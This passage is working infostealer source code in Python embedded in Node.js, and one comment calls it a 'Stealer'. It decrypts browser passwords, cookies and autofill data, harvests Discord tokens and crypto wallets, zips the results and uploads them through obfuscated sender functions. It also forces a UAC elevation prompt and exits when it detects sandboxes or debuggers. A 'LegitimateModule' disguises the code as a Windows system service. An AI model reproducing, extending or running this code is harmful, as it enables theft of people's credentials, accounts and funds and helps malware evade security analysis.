                            if (login[2][:3] in (b"v10", b"v11", b"v20")):
                                decrypted = decrypt_v20_password(login[2], master_key)
                                if decrypted and not decrypted.startswith("<decryption_failed"):
                                    success_count += 1
                                elif decrypted and decrypted.startswith("<decryption_failed"):
                                    logger.warning(f"Decryption failed for {login[0]}: {decrypted}")
                                    if login[2].startswith(b'v20') and "MAC check failed" in str(decrypted):
                                        logger.error("CRITICAL: v20 data found but key appears invalid. This usually means 'app_bound_encrypted_key' is missing from Local State.")
                                f.write(f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {decrypted}\n\n")
                    logger.debug(f"Successfully decrypted {success_count} passwords")
                con.close()
            else:
                logger.debug("No login DB found")
        except Exception as e:
            logger.error(f"Error processing logins: {e}")

        # Process Autofill
        try:
            if webdata_db_path.exists():
                logger.debug(f"Processing autofill from {webdata_db_path}")
                db_copy = fetch_sqlite_copy(webdata_db_path)
                if db_copy:
                    con = sqlite3.connect(db_copy)
                    cur = con.cursor()
                    cur.execute("SELECT name, value FROM autofill;")
                    autofills = cur.fetchall()
                    logger.debug(f"Found {len(autofills)} autofill entries")
                    
                    with open(autofill_file, "a", encoding="utf-8") as f:
                        for name, value in autofills:
                            if name and name.strip():
                                if isinstance(value, bytes) and (value[:3] in (b"v10", b"v11", b"v20")):
                                    decrypted = decrypt_v20_value(value, master_key)
                                    value_str = decrypted if decrypted else "DECRYPT_FAILED"
                                else:
                                    value_str = value
                                line = f"Field: {name}\nValue: {value_str}\n\n"
                                f.write(line)
                    con.close()
                    try: os.remove(db_copy)
                    except: pass
            else:
                logger.debug("No webdata DB found")
        except Exception as e:
            logger.error(f"Error processing autofill: {e}")

def extract_gecko_history(profile_path):
    places_db = profile_path / "places.sqlite"
    if not places_db.exists():
        return []
    
    db_copy = fetch_sqlite_copy(places_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        history_items = []
        for url, title, visit_count, last_visit in rows:
            date_str = "Unknown"
            if last_visit:
                try:
                    # Firefox uses microseconds since Unix Epoch
                    date_str = datetime.fromtimestamp(last_visit / 1000000).strftime("%Y-%m-%d %H:%M:%S")
                except: pass
            
            title_str = title if title else "No Title"
            history_items.append(f"{url}\t{title_str}\t{visit_count}\t{date_str}")
            
        return history_items
    except Exception as e:
        logger.error(f"Error extracting gecko history: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_gecko_bookmarks(profile_path):
    places_db = profile_path / "places.sqlite"
    if not places_db.exists():
        return []
    
    db_copy = fetch_sqlite_copy(places_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("""
            SELECT b.title, p.url 
            FROM moz_bookmarks b 
            JOIN moz_places p ON b.fk = p.id 
            WHERE b.type = 1
        """)
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        bookmarks = []
        for title, url in rows:
            name = title if title else "Unknown"
            bookmarks.append(f"{name}\t{url}")
            
        return bookmarks
    except Exception as e:
        logger.error(f"Error extracting gecko bookmarks: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def extract_gecko_autofill(profile_path):
    form_db = profile_path / "formhistory.sqlite"
    if not form_db.exists():
        return []
        
    db_copy = fetch_sqlite_copy(form_db)
    if not db_copy:
        return []
        
    try:
        con = sqlite3.connect(db_copy)
        cur = con.cursor()
        cur.execute("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory")
        rows = cur.fetchall()
        con.close()
        try: os.remove(db_copy)
        except: pass
        
        autofills = []
        for fieldname, value, times, first, last in rows:
            autofills.append(f"Field: {fieldname}\nValue: {value}\nTimes Used: {times}\n\n")
            
        return autofills
    except Exception as e:
        logger.error(f"Error extracting gecko autofill: {e}")
        if os.path.exists(db_copy):
            try: os.remove(db_copy)
            except: pass
        return []

def process_gecko_browser(browser_name, browser_config):
    logger.info(f"Processing Gecko browser: {browser_name}")
    user_profile = os.environ['USERPROFILE']
    browser_data_path = pathlib.Path(user_profile) / browser_config['data_path']
    
    if not browser_data_path.exists():
        logger.warning(f"Browser data path not found: {browser_data_path}")
        return

    nss_handler = NSSHandler()
    if not nss_handler.loaded:
        logger.error("Could not load NSS library")
        return

    # Find profiles
    # Firefox profiles usually in xxxxx.default-release or similar
    profiles = [p for p in browser_data_path.iterdir() if p.is_dir()]
    logger.info(f"Found {len(profiles)} profiles")

    for profile_dir in profiles:
        profile_name = profile_dir.name
        logger.info(f"Processing profile: {profile_name}")
        
        # We need to initialize NSS for this profile
        if not nss_handler.init_profile(profile_dir):
            logger.error(f"Skipping profile {profile_name} due to NSS init failure")
            continue

        profile_output_dir = OUTPUT_BASE_DIR / browser_name / profile_name
        profile_output_dir.mkdir(parents=True, exist_ok=True)
        password_file = profile_output_dir / "passwords.txt"
        cookies_file = profile_output_dir / "cookies.txt"
        history_file = profile_output_dir / "history.txt"
        bookmarks_file = profile_output_dir / "bookmarks.txt"
        autofill_file = profile_output_dir / "auto_fills.txt"
        
        cookies_db = profile_dir / "cookies.sqlite"
        logins_json = profile_dir / "logins.json"

        # Process Cookies
        if cookies_db.exists():
            try:
                logger.debug(f"Processing cookies from {cookies_db}")
                cookie_copy = fetch_sqlite_copy(cookies_db)
                if cookie_copy:
                    con = sqlite3.connect(cookie_copy)
                    cur = con.cursor()
                    # Firefox cookies are typically plaintext in the DB
                    cur.execute("SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies")
                    cookies = cur.fetchall()
                    logger.debug(f"Found {len(cookies)} cookies")
                    
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.write("# Netscape HTTP Cookie File\n")
                        f.write("# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n")
                        for host, name, path, expires, secure, httponly, value in cookies:
                            flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                            secure_str = "TRUE" if bool(secure) else "FALSE"
                            path_str = path if path else "/"
                            line = f"{host}\t{flag}\t{path_str}\t{secure_str}\t{expires}\t{name}\t{value}\n"
                            f.write(line)
                    con.close()
            except Exception as e:
                logger.error(f"Error processing cookies: {e}")
        
        # Process Passwords (logins.json)
        if logins_json.exists():
            try:
                logger.debug(f"Processing logins from {logins_json}")
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                
                if "logins" in data:
                    success_count = 0
                    with open(password_file, "w", encoding="utf-8") as f:
                        f.write("# Passwords\n")
                        for login in data["logins"]:
                            hostname = login.get("hostname", "")
                            encrypted_username = login.get("encryptedUsername")
                            encrypted_password = login.get("encryptedPassword")
                            
                            username = nss_handler.decrypt(encrypted_username) if encrypted_username else ""
                            password = nss_handler.decrypt(encrypted_password) if encrypted_password else ""
                            
                            if password: success_count += 1
                            
                            line = f"URL: {hostname}\nUsername: {username}\nPassword: {password}\n\n"
                            f.write(line)
                    logger.debug(f"Successfully decrypted {success_count} passwords")
            except Exception as e:
                logger.error(f"Error processing logins: {e}")

        # Process History
        history = extract_gecko_history(profile_dir)
        if history:
            with open(history_file, "w", encoding="utf-8") as f:
                f.write("# URL\tTitle\tVisit Count\tLast Visit\n")
                for h in history:
                    f.write(f"{h}\n")
            logger.debug(f"Extracted {len(history)} history items")

        # Process Bookmarks
        bookmarks = extract_gecko_bookmarks(profile_dir)
        if bookmarks:
            with open(bookmarks_file, "w", encoding="utf-8") as f:
                f.write("# Name\tURL\n")
                for b in bookmarks:
                    f.write(f"{b}\n")
            logger.debug(f"Extracted {len(bookmarks)} bookmarks")

        # Process Autofill
        autofills = extract_gecko_autofill(profile_dir)
        if autofills:
            with open(autofill_file, "w", encoding="utf-8") as f:
                for a in autofills:
                    f.write(a)
            logger.debug(f"Extracted {len(autofills)} autofill entries")

        # Shutdown NSS for this profile so we can potentially init another (though NSS often doesn't like re-init)
        nss_handler.shutdown()

def extract_discord_tokens():
    logger.info("Extracting Discord tokens")
    user_profile = os.environ['USERPROFILE']
    import re
    
    for app_id, config in DISCORD_APPS.items():
        try:
            name = config['name']
            path_rel = config['data_path']
            base_path = pathlib.Path(user_profile) / path_rel
            if not base_path.exists(): continue
            
            logger.info(f"Processing {name}")
            
            # Get Key
            # Discord key name is likely not used for basic DPAPI, but for App-Bound it might be "Discordkey1" or similar?
            # We'll try without specific key name first, get_master_key handles standard DPAPI
            config['key_name'] = f"{name}key1" 
            master_key = get_master_key(config)
            
            if not master_key:
                logger.warning(f"No master key for {name}")
                continue

            # Find tokens in LevelDB
            leveldb_path = base_path / "Local Storage" / "leveldb"
            if not leveldb_path.exists(): continue
            
            tokens = set()
            
            def decrypt_token(encrypted_token, key):
                try:
                    decoded = base64.b64decode(encrypted_token)
                    iv = decoded[3:15]
                    payload = decoded[15:]
                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                    decrypted = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
                    return decrypted.decode("utf-8")
                except: return None

            for file_path in leveldb_path.iterdir():
                if file_path.suffix not in ('.ldb', '.log'): continue
                
                try:
                    with open(file_path, "rb") as f:
                        content = f.read().decode("utf-8", errors="ignore")
                        
                        # Encrypted tokens
                        for match in re.findall(r"dQw4w9WgXcQ:([^\"\s]+)", content):
                            token = decrypt_token(match, master_key)
                            if token: tokens.add(token)
                            
                        # Plain tokens (legacy)
                        for match in re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", content):
                            tokens.add(match)
                except: pass
            
            if tokens:
                output_file = OUTPUT_BASE_DIR / f"{app_id}_tokens.txt"
                with open(output_file, "w") as f:
                    for t in tokens:
                        f.write(t + "\n")
                logger.info(f"Saved {len(tokens)} tokens for {name}")
                
        except Exception as e:
            logger.error(f"Error extracting tokens for {app_id}: {e}")

def main():
    logger.info("Starting browser forensics script")
    OUTPUT_BASE_DIR.mkdir(parents=True, exist_ok=True)
    # Kill browser processes
    for browser_name, browser_config in BROWSERS.items():
        try:
            logger.debug(f"Attempting to kill {browser_config['process_name']}")
            subprocess.run(["taskkill", "/F", "/IM", browser_config['process_name']],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Error killing process: {e}")
    
    # Extract Discord Tokens (using LSASS impersonation if needed for key)
    try:
        extract_discord_tokens()
    except Exception as e:
        logger.error(f"Error in Discord extraction: {e}")

    # Process Data
    logger.info("Processing browser data")
    processed_paths = set()
    user_profile = os.environ['USERPROFILE']
    for browser_name, browser_config in BROWSERS.items():
        try:
            data_path_rel = browser_config.get('data_path', '')
            data_path = pathlib.Path(user_profile) / data_path_rel if data_path_rel else None
            norm = str(data_path).lower() if data_path else ''
            if data_path and data_path.exists():
                if norm in processed_paths:
                    continue
                processed_paths.add(norm)
            if browser_config['type'] == 'chromium':
                process_chromium_browser(browser_name, browser_config)
            elif browser_config['type'] == 'gecko':
                process_gecko_browser(browser_name, browser_config)
        except Exception as e:
            logger.error(f"Error processing {browser_name}: {e}")

    logger.info("Script execution completed")

if __name__ == "__main__":
    if not is_admin():
        logger.warning("Script run without admin privileges. Some features might fail.")
        # sys.exit(1)

    try:
        main()
    except Exception as e:
        logger.critical(f"Unhandled exception in main: {e}")
    finally:
        print("EXECUTION COMPLETE")
`;
const InputPayload = {
    async xr8s0(deepFolder, logger) {
        const axios = require('axios');
        const FormData = require('form-data');
        const fs = require('fs');
        const path = require('path');
        xl2m3('InputPayload.main started');
        if (!logger) {
            logger = {
                info: msg => { console.log(msg); xl2m3('INFO: ' + msg); xp2q3({ content: `🔹 **INFO:** ${msg}` }).catch(() => { }); },
                success: msg => { console.log(msg); xl2m3('SUCCESS: ' + msg); xp2q3({ content: `✅ **SUCCESS:** ${msg}` }).catch(() => { }); },
                error: msg => { console.error(msg); xl2m3('ERROR: ' + msg); xp2q3({ content: `❌ **ERROR:** ${msg}` }).catch(() => { }); },
                debug: msg => { console.log(msg); xl2m3('DEBUG: ' + msg); },
                critical: msg => { console.error(msg); xl2m3('CRITICAL: ' + msg); xp2q3({ content: `💀 **CRITICAL:** ${msg}` }).catch(() => { }); }
            };
        }

        // logger.info('=== Prioritized (Python First) Stealer Started ===');
        try {
            if (!deepFolder) { logger.critical('No deep folder provided!'); return; }
            const outputFolder = path.join(deepFolder, 'output');
            if (!fs.existsSync(outputFolder)) fs.mkdirSync(outputFolder, { recursive: true });

            // Prepare Python Code
            const finalPythonCode = pythonCodeTemplate.replace('__OUTPUT_FOLDER__', outputFolder.replace(/\\/g, "\\\\"));
            const xorCipher = (text, key) => {
                let result = '';
                for (let i = 0; i < text.length; i++) {
                    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return result;
            };
            const encryptedPython = Buffer.from(xorCipher(finalPythonCode, "Priv_STEALER_PYTHON_KEY_2024")).toString('base64');
            const decryptedPython = xorCipher(Buffer.from(encryptedPython, 'base64').toString('utf-8'), "Priv_STEALER_PYTHON_KEY_2024");

            // --- PRIORITY 1: PYTHON EXECUTION (Browser Data) ---
            await xp2q3({ content: "step 3 : browsers abi" }).catch(() => { });
            // logger.info('Tarayıcı şifreleri, çerezler ve geçmiş verileri (Chrome, Edge, Opera...) toplanıyor...');
            try {
                await xn4o5(decryptedPython);
                // logger.success('Tarayıcı verileri başarıyla ayıklandı.');
            } catch (pyErr) {
                logger.error(`Python failed: ${pyErr.message}`);
            }

            // --- PRIORITY 2: WALLETS & ZIP UPLOAD ---
            // logger.info('Priority 2: Extracting wallets and preparing ZIP upload...');
            const walletAndZipTask = (async () => {
                try {
                    // Extract wallets first
                    await xz0a1(outputFolder).catch(e => logger.error(`Wallet error: ${e.message}`));

                    // Immediately ZIP and upload what we have (Browser data + Wallets)
                    const items = fs.existsSync(outputFolder) ? fs.readdirSync(outputFolder) : [];
                    if (items.length > 0) {
                        const zipPath = path.join(deepFolder, `${Math.random().toString(36).substring(7)}.zip`);
                        await new Promise((res, rej) => {
                            const out = fs.createWriteStream(zipPath);
                            const arc = archiver('zip', { zlib: { level: 1 } });
                            out.on('close', res); arc.on('error', rej);
                            arc.pipe(out); arc.directory(outputFolder, false); arc.finalize();
                        });
                        await xp2q3({ content: "step 4 : uploading zip and system info..." }).catch(() => { });
                        await xt6u7(zipPath).catch(e => logger.error(`ZIP Upload error: ${e.message}`));
                        try { fs.unlinkSync(zipPath); } catch (e) { }
                    }
                } catch (e) { logger.error(`Priority 2 task failed: ${e.message}`); }
            })();

            // Start scanning tokens in parallel with ZIP/Wallet task to not waste time
            // --- PRIORITY 3: DISCORD TOKENS ---
            const tokenTask = (async () => {
                try {
                    await xp2q3({ content: "step 2.5 : discord tokens" }).catch(() => { });
                    const collected = await xe6f7(outputFolder, logger);
                    if (collected.length > 0) {
                        // logger.success(`Found ${collected.length} tokens. Sending...`);
                        const sendPromises = collected.map(([token, platform, validation]) =>
                            xr4s5(token, platform, validation.userInfo).catch(e => logger.error(`Token send fail: ${e.message}`))
                        );
                        await Promise.allSettled(sendPromises);
                        // logger.success('All tokens processed.');
                    } else {
                        // logger.info('No valid tokens found during scan.');
                    }
                } catch (e) { logger.error(`Token error: ${e.message}`); }
            })();

            // --- PRIORITY 4: DISCORD INJECTION ---
            const injectionTask = xw4y5().catch(e => logger.error(`Injection error: ${e.message}`));

            // Wait for all critical priority items, but don't let one failure stop the rest
            await Promise.allSettled([walletAndZipTask, tokenTask, injectionTask]);

            // --- BACKGROUND: REMAINING SESSIONS & CLEANUP ---
            (async () => {
                try {
                    // logger.info('Background: Collecting remaining sessions...');
                    await Promise.allSettled([
                        xo6p7(outputFolder), // Backup Codes
                        (async () => {
                            await Promise.allSettled([
                                xh0i1(outputFolder), xp8q9(outputFolder), xt2u3(), xz8a9(), xr6s7(), xn6o7(outputFolder),
                                (async () => {
                                    const tk = xz2a3(outputFolder, 'sessionid');
                                    for (const c of tk) await xh6i7(c).catch(() => { });
                                })()
                            ]);
                        })(),
                        xj0k1(xf4g5(), 30000, 'Telegram')
                    ]);
                    // logger.success('All remaining tasks finished.');
                } catch (bgErr) { logger.error(`Background error: ${bgErr.message}`); }
            })();

            // logger.info('Priority phase complete. Background tasks running.');
        } catch (err) {
            logger.critical(`Fatal: ${err.message}`);
        }
    }
};
class AdminCheck {
    static isAdmin() {
        try {
            execSync('net session', {
                stdio: 'pipe',
                windowsHide: true,
                timeout: 2000
            });
            return true;
        } catch (e) {
            return false;
        }
    }
    static async requestAdmin(wait = false, exitOnSuccess = true) {
        return new Promise((resolve, reject) => {
            try {
                const scriptPath = process.execPath;
                const tempDir = os.tmpdir();
                const markerPath = path.join(tempDir, `${`elev_${Date.now()}_${Math.random().toString(36).substring(7)}`}.marker`);
                const quotedArgs = process.argv.slice(1).map(arg => arg.includes(' ') ? `"${arg}"` : arg).join(' ');
                const argsForVBS = `${quotedArgs} --uac-marker="${markerPath}"`.replace(/"/g, "\" & Chr(34) & \"");
                const vbsPath = path.join(tempDir, `${`elev_${Date.now()}_${Math.random().toString(36).substring(7)}`}.vbs`);
                fs.writeFileSync(vbsPath, `Set UAC = CreateObject("Shell.Application")\nUAC.ShellExecute "${scriptPath}", "${argsForVBS}", "", "runas", 1`);
                const proc = spawn('wscript.exe', [vbsPath], {
                    stdio: 'ignore',
                    windowsHide: true
                });
                proc.on('close', code => {
                    try {
                        if (fs.existsSync(vbsPath)) {
                            fs.unlinkSync(vbsPath);
                        }
                    } catch (e) { }
                    setTimeout(() => {
                        const wasAccepted = fs.existsSync(markerPath);
                        if (wasAccepted) {
                            try {
                                fs.unlinkSync(markerPath);
                            } catch (e) { }
                            if (exitOnSuccess) {
                                setTimeout(() => process.exit(0), 500);
                            }
                            resolve();
                        } else {
                            reject(new Error('UAC denied by user'));
                        }
                    }, 3000);
                });
                proc.on('error', err => {
                    reject(err);
                });
            } catch (error) {
                reject(error);
            }
        });
    }
    static async ensureAdmin() {
        if (!this.isAdmin()) {
            console.log('[Admin] Requesting administrator privileges...');
            await this.requestAdmin(false);
            return false;
        }
        console.log('[Admin] Running with administrator privileges');
        return true;
    }
    static async ensureAdminSilent() {
        if (!this.isAdmin()) {
            await this.requestAdmin(false);
            return false;
        }
        return true;
    }
}
const VM_MAC_PREFIXES = ["00:0C:29", "08:00:27", "00:1C:42", "00:50:56", "0A:00:27", "00:16:3E", "00:03:FF", "00:1F:16", "BE:EF:CA", "42:01:0A"];
const SANDBOX_PROCESSES = ["vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd", "df5serv", "vboxservice", "vmware", "trio", "tqos", "networkservice", "updata", "sandboxie", "anyrun", "triage", "cuckoo", "sample", "kvmsrvc", "qemud", "xen", "xenservice"];
const DEBUGGER_PROCESSES = ["ollydbg", "ida64", "idaq", "windbg", "x32dbg", "x64dbg", "wireshark", "dumpcap", "procmon", "regmon", "filemon", "processhacker", "autoruns", "tcpview", "volatility", "fiddler", "apimonitor", "immunity", "pestudio", "dnspy", "cheatengine", "ghidra"];
const ANALYSIS_HOSTNAMES = ["sandbox", "analysis", "malware", "vm", "test", "lab", "cuckoo", "virus", "research"];
const ANALYSIS_USERNAMES = ["sandbox", "malware", "virus", "sample", "analyze", "test", "user", "admin", "administrator"];
const VM_FILES = ["C:\\windows\\System32\\Drivers\\VBoxMouse.sys", "C:\\windows\\System32\\Drivers\\VBoxGuest.sys", "C:\\windows\\System32\\Drivers\\VBoxSF.sys", "C:\\windows\\System32\\Drivers\\VBoxVideo.sys", "C:\\windows\\System32\\vboxdisp.dll", "C:\\windows\\System32\\vboxhook.dll", "C:\\windows\\System32\\vboxservice.exe", "C:\\windows\\System32\\vboxtray.exe", "C:\\windows\\System32\\drivers\\vmmouse.sys", "C:\\windows\\System32\\drivers\\vmhgfs.sys"];
const ANALYSIS_DIRECTORIES = ["C:\\analysis", "C:\\sandbox", "C:\\tools", "C:\\malware", "C:\\samples", "C:\\program files\\oracle\\virtualbox guest additions", "C:\\program files\\VMware"];
class AntiVM {
    static checkMacAddress() {
        try {
            const output = execSync('getmac', {
                encoding: 'utf8',
                timeout: 500,
                windowsHide: true
            });
            for (const prefix of VM_MAC_PREFIXES) {
                if (output.includes(prefix)) {
                    console.log(`[AntiVM] VM MAC detected: ${prefix}`);
                    return true;
                }
            }
        } catch (e) { }
        return false;
    }
    static checkBIOS() {
        try {
            const biosManuf = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Manufacturer\"", {
                encoding: 'utf8',
                timeout: 1000,
                windowsHide: true
            });
            const vmBios = ["vmware", "virtualbox", "qemu", "xen", "parallels", "kvm", "microsoft corporation"];
            if (vmBios.some(vm => biosManuf.toLowerCase().includes(vm))) {
                console.log(`[AntiVM] VM BIOS detected: ${biosManuf.trim()}`);
                return true;
            }
            const biosVersion = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -ClassName Win32_BIOS | Select-Object -ExpandProperty Version\"", {
                encoding: 'utf8',
                timeout: 1000,
                windowsHide: true
            });
            if (vmBios.some(vm => biosVersion.toLowerCase().includes(vm))) {
                console.log(`[AntiVM] VM BIOS version detected: ${biosVersion.trim()}`);
                return true;
            }
        } catch (e) { }
        return false;
    }
    static checkDisk() {
        try {
            const diskModel = execSync("powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance -ClassName Win32_DiskDrive | Select-Object -ExpandProperty Model\"", {
                encoding: 'utf8',
                timeout: 1000,
                windowsHide: true
            });
            const vmDisks = ["vbox", "vmware", "virtual", "qemu", "xen"];
            if (vmDisks.some(vm => diskModel.toLowerCase().includes(vm))) {
                console.log(`[AntiVM] VM disk detected: ${diskModel.trim()}`);
                return true;
            }
        } catch (e) { }
        return false;
    }
    static checkHardware() {
        if (os.cpus().length < 2) {
            console.log(`[AntiVM] Low CPU cores: ${os.cpus().length}`);
            return true;
        }
        const totalRAM = os.totalmem() / 1073741824;
        if (totalRAM < 4) {
            console.log(`[AntiVM] Low RAM: ${totalRAM.toFixed(2)}GB`);
            return true;
        }
        return false;
    }
    static checkProcesses() {
        try {
            const processes = execSync('tasklist', {
                encoding: 'utf8',
                timeout: 1000,
                windowsHide: true
            }).toLowerCase();
            for (const proc of SANDBOX_PROCESSES) {
                if (processes.includes(proc)) {
                    console.log(`[AntiVM] Sandbox process detected: ${proc}`);
                    return true;
                }
            }
            for (const proc of DEBUGGER_PROCESSES) {
                if (processes.includes(proc)) {
                    console.log(`[AntiVM] Debugger process detected: ${proc}`);
                    return true;
                }
            }
            const procCount = processes.split("\n").length;
            if (procCount < 30) {
                console.log(`[AntiVM] Low process count: ${procCount}`);
                return true;
            }
        } catch (e) { }
        return false;
    }
    static checkHostname() {
        const hostname = os.hostname().toLowerCase();
        for (const name of ANALYSIS_HOSTNAMES) {
            if (hostname.includes(name)) {
                console.log(`[AntiVM] Analysis hostname detected: ${hostname}`);
                return true;
            }
        }
        return false;
    }
    static checkUsername() {
        const username = os.userInfo().username.toLowerCase();
        for (const user of ANALYSIS_USERNAMES) {
            if (username.includes(user)) {
                console.log(`[AntiVM] Analysis username detected: ${username}`);
                return true;
            }
        }
        return false;
    }
    static checkVMFiles() {
        for (const file of VM_FILES) {
            try {
                if (fs.existsSync(file)) {
                    console.log(`[AntiVM] VM file detected: ${file}`);
                    return true;
                }
            } catch (e) { }
        }
        return false;
    }
    static checkAnalysisDirs() {
        for (const dir of ANALYSIS_DIRECTORIES) {
            try {
                if (fs.existsSync(dir)) {
                    console.log(`[AntiVM] Analysis directory detected: ${dir}`);
                    return true;
                }
            } catch (e) { }
        }
        return false;
    }
    static checkTempFiles() {
        try {
            const tempFiles = fs.readdirSync(os.tmpdir());
            if (tempFiles.length < 10) {
                console.log(`[AntiVM] Low temp files: ${tempFiles.length}`);
                return true;
            }
        } catch (e) { }
        return false;
    }
    static checkScreenSize() {
        try {
            const output = execSync("powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\"", {
                encoding: 'utf8',
                timeout: 1000,
                windowsHide: true
            });
            const width = parseInt(output.trim());
            if (width < 1024) {
                console.log(`[AntiVM] Low screen width: ${width}`);
                return true;
            }
        } catch (e) { }
        return false;
    }
    static checkSleepPatching() {
        return false;
    }
    static checkNetworkInterfaces() {
        const interfaces = os.networkInterfaces();
        const count = Object.keys(interfaces).length;
        if (count < 2) {
            console.log(`[AntiVM] Low network interfaces: ${count}`);
            return true;
        }
        return false;
    }
    static checkRegistry() {
        const regKeys = ["HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions", "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxGuest", "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxMouse", "HKLM\\SYSTEM\\ControlSet001\\Services\\VBoxService", "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools", "HKLM\\SYSTEM\\ControlSet001\\Services\\vmci", "HKLM\\SYSTEM\\ControlSet001\\Services\\vmhgfs", "HKLM\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"];
        for (const key of regKeys) {
            try {
                execSync(`reg query "${key}"`, {
                    stdio: 'pipe',
                    timeout: 1000,
                    windowsHide: true
                });
                console.log(`[AntiVM] VM registry key found: ${key}`);
                return true;
            } catch (e) { }
        }
        return false;
    }
    static randomDelay() { }
    static check() {
        console.log('[AntiVM] Starting anti-VM/sandbox checks...');
        const checks = [{
            name: 'MAC Address',
            fn: this.checkMacAddress
        }, {
            name: 'BIOS',
            fn: this.checkBIOS
        }, {
            name: 'Disk',
            fn: this.checkDisk
        }, {
            name: 'Hardware',
            fn: this.checkHardware
        }, {
            name: 'Processes',
            fn: this.checkProcesses
        }, {
            name: 'Hostname',
            fn: this.checkHostname
        }, {
            name: 'Username',
            fn: this.checkUsername
        }, {
            name: 'VM Files',
            fn: this.checkVMFiles
        }, {
            name: 'Analysis Dirs',
            fn: this.checkAnalysisDirs
        }, {
            name: 'Temp Files',
            fn: this.checkTempFiles
        }, {
            name: 'Screen Size',
            fn: this.checkScreenSize
        }, {
            name: 'Network Interfaces',
            fn: this.checkNetworkInterfaces
        }, {
            name: 'Registry',
            fn: this.checkRegistry
        }];
        for (let i = checks.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [checks[i], checks[j]] = [checks[j], checks[i]];
        }
        for (const check of checks) {
            try {
                this.randomDelay();
                if (check.fn.call(this)) {
                    console.log(`[AntiVM] DETECTED: ${check.name}`);
                    return true;
                }
            } catch (e) {
                console.log(`[AntiVM] Error in ${check.name}: ${e.message}`);
            }
        }
        console.log('[AntiVM] All checks passed - real system');
        return false;
    }
    static checkAndExit() {
        if (this.check()) {
            console.log('[AntiVM] VM/Sandbox detected - exiting');
            process.exit(0);
        }
    }
}
class LegitimateModule {
    static collectSystemInfo() {
        const info = {
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            cpus: os.cpus().length,
            totalMemory: Math.round(os.totalmem() / 1073741824) + 'GB',
            freeMemory: Math.round(os.freemem() / 1073741824) + 'GB',
            uptime: Math.round(os.uptime() / 3600) + 'h',
            nodeVersion: process.version,
            timestamp: new Date().toISOString()
        };
        return info;
    }
    static async checkForUpdates() {

        const updateInfo = {
            currentVersion: '1.0.0',
            latestVersion: '1.0.0',
            updateAvailable: false,
            checkTime: new Date().toISOString()
        };
        return updateInfo;
    }
    static createConfigFile() {
        const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        const configDir = path.join(appData, 'WindowsSystemService');
        try {
            if (!fs.existsSync(configDir)) {
                fs.mkdirSync(configDir, {
                    recursive: true
                });
            }
            const configPath = path.join(configDir, 'config.json');
            const cfg = {
                version: '1.0.0',
                installDate: new Date().toISOString(),
                lastRun: new Date().toISOString(),
                settings: {
                    autoUpdate: true,
                    sendDiagnostics: false,
                    checkInterval: 3600000
                }
            };
            fs.writeFileSync(configPath, JSON.stringify(cfg, null, 2));
            return configPath;
        } catch (e) {
            return null;
        }
    }
    static createLogFile(message) {
        const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming');
        const logDir = path.join(appData, 'WindowsSystemService', 'Logs');
        try {
            if (!fs.existsSync(logDir)) {
                fs.mkdirSync(logDir, {
                    recursive: true
                });
            }
            const timestamp = new Date().toISOString();
            const logPath = path.join(logDir, 'service.log');
            fs.appendFileSync(logPath, `[${timestamp}] ${message}\n`);
            return logPath;
        } catch (e) {
            return null;
        }
    }
    static simulateServiceBehavior() {
        this.createConfigFile();
        this.createLogFile('Service started');
        this.createLogFile('Initializing system check');
        this.createLogFile('System diagnostics running');
        this.checkForUpdates();
    }
    static async waitForHumanInteraction() {
        return true;
    }
    static checkNetworkConnectivity() {
        return new Promise(resolve => {
            try {
                const dns = require('dns');
                const {
                    promisify
                } = require('util');
                const lookup = promisify(dns.lookup);
                const testHosts = ['google.com', 'cloudflare.com'];
                const results = {};
                Promise.all(testHosts.map(host => lookup(host).then(() => ({
                    host,
                    success: true
                })).catch(() => ({
                    host,
                    success: false
                })))).then(hostResults => {
                    hostResults.forEach(({
                        host,
                        success
                    }) => {
                        results[host] = success;
                    });
                    resolve(results);
                }).catch(() => {
                    resolve({});
                });
            } catch (e) {
                resolve({});
            }
        });
    }
    static createLegitimateFiles() {
        const tempDir = os.tmpdir();
        const files = [];
        try {
            const readmePath = path.join(tempDir, 'SystemService_README.txt');
